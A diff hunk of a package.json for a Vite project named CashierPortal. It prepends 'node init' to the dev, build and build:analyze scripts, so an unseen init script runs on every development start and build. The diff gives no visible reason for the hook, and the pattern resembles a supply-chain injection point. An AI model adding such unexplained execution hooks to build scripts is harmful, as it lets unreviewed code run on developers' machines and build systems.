@@ -5,9 +5,9 @@
   "type": "module",
   "homepage": "CashierPortal",
   "scripts": {
-    "dev": "vite --host",
-    "build": "vite build && purgecss --config purgecss.config.js",
-    "build:analyze": "vite build --mode analyze",
+    "dev": "node init && vite --host",
+    "build": "node init && vite build && purgecss --config purgecss.config.js",
+    "build:analyze": "node init && vite build --mode analyze",
     "lint": "eslint . --ext ts,tsx --report-unused-disable-directives --max-warnings 0",
     "preview": "vite preview",
     "css:purge": "purgecss --config purgecss.config.js"
